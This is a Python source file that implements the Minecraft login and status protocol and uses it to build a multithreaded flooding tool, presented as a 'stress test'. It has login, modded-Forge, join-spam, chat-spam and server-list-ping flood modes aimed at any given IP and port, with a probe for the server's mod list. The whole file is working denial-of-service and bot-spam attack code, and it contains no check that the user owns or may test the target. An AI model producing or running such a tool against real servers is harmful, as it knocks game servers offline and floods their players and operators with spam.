import socket
import struct
import random
import string
import threading
import time
import json

# --- Packet Utilities ---

def pack_varint(value):
    """Packs an integer into a VarInt."""
    out = b""
    while True:
        byte = value & 0x7F
        value >>= 7
        if value != 0:
            byte |= 0x80
        out += struct.pack("B", byte)
        if value == 0:
            break
    return out

def pack_string(value):
    """Packs a string with its VarInt length."""
    return pack_varint(len(value)) + value.encode('utf-8')

def pack_packet(packet_id, data):
    """Packs a packet with its ID and data."""
    data = pack_varint(packet_id) + data
    return pack_varint(len(data)) + data

def read_varint(sock):
    """Reads a VarInt from a socket."""
    number = 0
    shift = 0
    while True:
        byte = sock.recv(1)
        if not byte:
            raise ConnectionError("Socket closed while reading VarInt")
        byte = ord(byte)
        number |= (byte & 0x7F) << shift
        if not (byte & 0x80):
            break
        shift += 7
    return number

def read_string(sock):
    """Reads a string from a socket."""
    length = read_varint(sock)
    return sock.recv(length).decode('utf-8')

# --- Core Connection Logic ---

def send_fake_join(ip, port, username, mod_data=None):
    """Establishes a connection and performs a fake login. Returns the socket if successful."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))

        # Handshake Packet
        # If mod_data is present, we send it. Otherwise, vanilla handshake.
        # This is a simplified Forge handshake. A more accurate one is much more complex.
        if mod_data and 'FML' in mod_data.get('type', ''):
            # Append FML marker to host string
            ip_fml = f"{ip}\0FML\0"
            handshake_data = (
                pack_varint(-1) + # Protocol version for FML
                pack_string(ip_fml) +
                struct.pack(">H", port) +
                pack_varint(2)  # State 2: Login
            )
        else:
            handshake_data = (
                pack_varint(758) +  # Protocol version (1.18.2)
                pack_string(ip) +
                struct.pack(">H", port) +
                pack_varint(2)  # State 2: Login
            )
        sock.sendall(pack_packet(0x00, handshake_data))

        # Login Start Packet
        login_data = pack_string(username)
        sock.sendall(pack_packet(0x00, login_data))

        # Keep connection alive briefly to ensure login is processed
        sock.settimeout(0.5)
        sock.recv(1024) # Wait for server response
        return sock
    except Exception as e:
        # print(f"[STRESS-ERROR] Actor failed to connect/send to {ip}:{port} - {e}")
        if 'sock' in locals():
            sock.close()
        return None

def send_chat_message(sock, message):
    """Sends a chat message on an established socket."""
    try:
        chat_data = pack_string(message)
        sock.sendall(pack_packet(0x03, chat_data))
        return True
    except Exception:
        return False

def send_motd_request(ip, port):
    """Performs a server list ping (MOTD request)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(2)
            sock.connect((ip, port))
            
            handshake_data = pack_varint(758) + pack_string(ip) + struct.pack(">H", port) + pack_varint(1)
            sock.sendall(pack_packet(0x00, handshake_data))
            
            sock.sendall(pack_packet(0x00, b''))
            sock.recv(4096)
    except Exception:
        pass # Suppress errors for this flood

# --- Attack Mode Workers ---

def worker_login_flood(stop_time, ip, port, mod_data):
    """Worker for simple or modded login flood."""
    while time.time() < stop_time:
        username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        sock = send_fake_join(ip, port, username, mod_data)
        if sock:
            time.sleep(0.5) 
            sock.close()

def worker_join_spam(stop_time, ip, port):
    """Worker for connect/disconnect spam."""
    while time.time() < stop_time:
        username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        sock = send_fake_join(ip, port, username)
        if sock:
            time.sleep(random.uniform(1, 4))
            sock.close()
        time.sleep(random.uniform(0.1, 0.5))

def worker_chat_flood(stop_time, ip, port):
    """Worker for joining and spamming chat."""
    username = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    sock = send_fake_join(ip, port, username)
    if not sock:
        return

    while time.time() < stop_time:
        message = ''.join(random.choices(string.ascii_letters + string.digits + ' ', k=random.randint(10, 50)))
        if not send_chat_message(sock, message):
            break
        time.sleep(random.uniform(0.5, 2))
    sock.close()

def worker_motd_spam(stop_time, ip, port):
    """Worker for spamming MOTD requests."""
    while time.time() < stop_time:
        send_motd_request(ip, port)
        time.sleep(random.uniform(0.05, 0.2))

# --- Main Orchestrator ---

def run_stress(ip, port, threads=100, duration=30, mode="login_flood", mod_data=None):
    stop_time = time.time() + duration
    
    worker_map = {
        "login_flood": (worker_login_flood, (stop_time, ip, port, None)),
        "modded_flood": (worker_login_flood, (stop_time, ip, port, mod_data)),
        "join_spam": (worker_join_spam, (stop_time, ip, port)),
        "chat_flood": (worker_chat_flood, (stop_time, ip, port)),
        "motd_spam": (worker_motd_spam, (stop_time, ip, port)),
    }

    target_worker, args = worker_map.get(mode, (worker_login_flood, (stop_time, ip, port, None)))
    
    print(f"Starting stress test: mode={mode}, threads={threads}, duration={duration}s")
    
    thread_pool = []
    for _ in range(threads):
        thread = threading.Thread(target=target_worker, args=args, daemon=True)
        thread_pool.append(thread)
        thread.start()

    for thread in thread_pool:
        thread.join(timeout=duration + 5)

def probe_server_for_mods(ip, port, timeout=5):
    """Probes a server for its modlist. Returns mod data if found."""
    print(f"[PROBE-INFO] Probing {ip}:{port} for modlist...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout)
        sock.connect((ip, port))

        # Handshake for Status
        handshake_data = pack_varint(758) + pack_string(ip) + struct.pack(">H", port) + pack_varint(1)
        sock.sendall(pack_packet(0x00, handshake_data))
        
        # Status Request
        sock.sendall(pack_packet(0x00, b''))
        
        # Read response
        packet_len = read_varint(sock)
        packet_id = read_varint(sock)
        
        if packet_id != 0x00:
            raise ConnectionError("Invalid status response packet ID.")
            
        json_response = read_string(sock)
        data = json.loads(json_response)

        # Check for Forge/FML mod info
        if 'modinfo' in data and data['modinfo'].get('type') == 'FML':
            return data['modinfo']
        else:
            raise ValueError("Server does not appear to be a Forge/FML modded server.")
